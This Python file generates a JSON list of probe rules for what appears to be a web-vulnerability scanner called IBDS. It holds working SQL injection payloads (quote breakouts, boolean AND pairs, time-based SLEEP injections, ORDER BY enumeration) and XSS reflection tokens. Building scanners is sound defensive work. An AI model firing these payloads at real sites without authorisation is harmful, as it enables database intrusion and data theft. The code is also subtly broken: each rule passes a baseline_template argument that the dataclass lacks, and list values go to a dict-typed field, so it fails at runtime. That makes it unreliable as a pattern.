from __future__ import annotations

import json
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any


@dataclass(frozen=True)
class AttackRule:
    attack_id: str
    vuln_type: str
    technique: str
    sequence: list[str]
    payload_sets: dict[str, list[str]]
    evidence_required: list[str]
    target_hint: dict[str, Any] = field(default_factory=dict)
    baseline_policy: dict[str, Any] = field(
        default_factory=lambda: {
            "mode": "reuse_per_target",
            "refresh_interval_seconds": 30,
        }
    )


def _sqli_error_rule() -> AttackRule:
    return AttackRule(
        attack_id="AR-SQLI-ERR",
        vuln_type="sqli",
        technique="error",
        sequence=["baseline", "error_attack"],
        baseline_template="{value}",
        payload_sets=[
            {
                "set_id": "AR-SQLI-ERR-001",
                "error_attack": "{value}'",
            },
            {
                "set_id": "AR-SQLI-ERR-002",
                "error_attack": '{value}"',
            },
            {
                "set_id": "AR-SQLI-ERR-003",
                "error_attack": "{value}'-- ",
            },
            {
                "set_id": "AR-SQLI-ERR-004",
                "error_attack": '{value}"-- ',
            },
            {
                "set_id": "AR-SQLI-ERR-005",
                "error_attack": "{value}')",
            },
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "filtered_body_hash",
            "elapsed_ms",
            "db_error_signature",
        ],
        target_hint={"parameter_types": ["query", "body"], "single_parameter_only": True},
    )


def _sqli_boolean_rule() -> AttackRule:
    return AttackRule(
        attack_id="AR-SQLI-BOOL",
        vuln_type="sqli",
        technique="boolean",
        sequence=["baseline", "boolean_true", "boolean_false"],
        payload_sets=[
            {
                "set_id": "single_quote",
                "baseline": "{value}",
                "boolean_true": "{value}' AND '1'='1",
                "boolean_false": "{value}' AND '1'='2",
            },
            {
                "set_id": "double_quote",
                "baseline": "{value}",
                "boolean_true": "{value}\" AND \"1\"=\"1",
                "boolean_false": "{value}\" AND \"1\"=\"2",
            },
            {
                "set_id": "numeric",
                "baseline": "{value}",
                "boolean_true": "{value} AND 1=1",
                "boolean_false": "{value} AND 1=2",
            },
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "filtered_body_hash",
            "title",
            "redirect_location",
            "elapsed_ms",
        ],
        target_hint={"parameter_types": ["query", "body"], "single_parameter_only": True},
    )


def _sqli_time_rule(delay_seconds: int) -> AttackRule:
    return AttackRule(
        attack_id="AR-SQLI-TIME",
        vuln_type="sqli",
        technique="time",
        sequence=["baseline", "time_control", "time_delay", "time_retry"],
        baseline_template="{value}",
        payload_sets=[
            {
                "set_id": "AR-SQLI-TIME-001",
                "time_control": "{value}' AND SLEEP(0)-- ",
                "time_delay": f"{{value}}' AND SLEEP({delay_seconds})-- ",
                "time_retry": f"{{value}}' AND SLEEP({delay_seconds})-- ",
            },
            {
                "set_id": "AR-SQLI-TIME-002",
                "time_control": '{value}" AND SLEEP(0)-- ',
                "time_delay": f'{{value}}" AND SLEEP({delay_seconds})-- ',
                "time_retry": f'{{value}}" AND SLEEP({delay_seconds})-- ',
            },
            {
                "set_id": "AR-SQLI-TIME-003",
                "time_control": "{value} AND SLEEP(0)",
                "time_delay": f"{{value}} AND SLEEP({delay_seconds})",
                "time_retry": f"{{value}} AND SLEEP({delay_seconds})",
            },
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "elapsed_ms",
            "timeout",
        ],
        target_hint={"parameter_types": ["query", "body"], "single_parameter_only": True},
    )


def _sqli_order_by_rule(max_order_by: int) -> AttackRule:
    sequence = ["baseline"] + [f"order_by_{index}" for index in range(1, max_order_by + 1)]

    single_quote_set = {"set_id": "AR-SQLI-ORDER-001"}
    double_quote_set = {"set_id": "AR-SQLI-ORDER-002"}
    numeric_set = {"set_id": "AR-SQLI-ORDER-003"}

    for index in range(1, max_order_by + 1):
        single_quote_set[f"order_by_{index}"] = f"{{value}}' ORDER BY {index}-- "
        double_quote_set[f"order_by_{index}"] = f'{{value}}" ORDER BY {index}-- '
        numeric_set[f"order_by_{index}"] = f"{{value}} ORDER BY {index}"

    return AttackRule(
        attack_id="AR-SQLI-ORDER",
        vuln_type="sqli",
        technique="order_by",
        sequence=sequence,
        baseline_template="{value}",
        payload_sets=[
            single_quote_set,
            double_quote_set,
            numeric_set,
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "filtered_body_hash",
            "elapsed_ms",
            "db_error_signature",
        ],
        target_hint={
            "parameter_types": ["query", "body"],
            "single_parameter_only": True,
            "max_order_by": max_order_by,
        },
    )


def _xss_reflection_rule() -> AttackRule:
    return AttackRule(
        attack_id="AR-XSS-REFLECT",
        vuln_type="xss",
        technique="reflection",
        sequence=["baseline", "random_token"],
        baseline_template="{value}",
        payload_sets=[
            {
                "set_id": "AR-XSS-REFLECT-001",
                "random_token": "IBDS_REFLECT_{token}",
            },
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "reflected_token",
            "reflection_locations",
        ],
        target_hint={"parameter_types": ["query", "body"], "single_parameter_only": True},
    )


def _xss_escape_rule() -> AttackRule:
    return AttackRule(
        attack_id="AR-XSS-ESCAPE",
        vuln_type="xss",
        technique="escape",
        sequence=["baseline", "special_chars_token"],
        baseline_template="{value}",
        payload_sets=[
            {
                "set_id": "AR-XSS-ESCAPE-001",
                "special_chars_token": "IBDS_ESC_{token}<>\"'&",
            },
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "raw_reflection",
            "encoded_reflection",
            "escaped_chars",
        ],
        target_hint={"parameter_types": ["query", "body"], "single_parameter_only": True},
    )


def _xss_context_rule() -> AttackRule:
    return AttackRule(
        attack_id="AR-XSS-CONTEXT",
        vuln_type="xss",
        technique="context",
        sequence=["baseline", "context_token"],
        baseline_template="{value}",
        payload_sets=[
            {
                "set_id": "AR-XSS-CONTEXT-001",
                "context_token": "IBDS_CTX_{token}",
            },
        ],
        evidence_required=[
            "status_code",
            "body_length",
            "body_hash",
            "html_context",
            "tag_name",
            "attribute_name",
        ],
        target_hint={"parameter_types": ["query", "body"], "single_parameter_only": True},
    )


def build_attack_request_list(
    *,
    max_order_by: int = 10,
    delay_seconds: int = 5,
    include_sqli: bool = True,
    include_xss: bool = True,
) -> dict[str, Any]:
    if max_order_by < 1:
        raise ValueError("max_order_by must be greater than or equal to 1")
    if delay_seconds < 1:
        raise ValueError("delay_seconds must be greater than or equal to 1")

    rules: list[AttackRule] = []

    if include_sqli:
        rules.extend(
            [
                _sqli_error_rule(),
                _sqli_boolean_rule(),
                _sqli_time_rule(delay_seconds),
                _sqli_order_by_rule(max_order_by),
            ]
        )

    if include_xss:
        rules.extend(
            [
                _xss_reflection_rule(),
                _xss_escape_rule(),
                _xss_context_rule(),
            ]
        )

    return {
        "version": "1.1",
        "description": (
            "Attack request list for IBDS. This file defines request groups only. "
            "It must not mutate requests, send HTTP traffic, or decide findings."
        ),
        "rules": [asdict(rule) for rule in rules],
    }


def export_attack_request_list(
    output_path: str | Path = "attack_request_list.json",
    *,
    max_order_by: int = 10,
    delay_seconds: int = 5,
    include_sqli: bool = True,
    include_xss: bool = True,
) -> Path:
    output = Path(output_path)
    output.parent.mkdir(parents=True, exist_ok=True)

    data = build_attack_request_list(
        max_order_by=max_order_by,
        delay_seconds=delay_seconds,
        include_sqli=include_sqli,
        include_xss=include_xss,
    )

    output.write_text(
        json.dumps(data, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    return output


if __name__ == "__main__":
    path = export_attack_request_list()
    print(f"saved: {path}")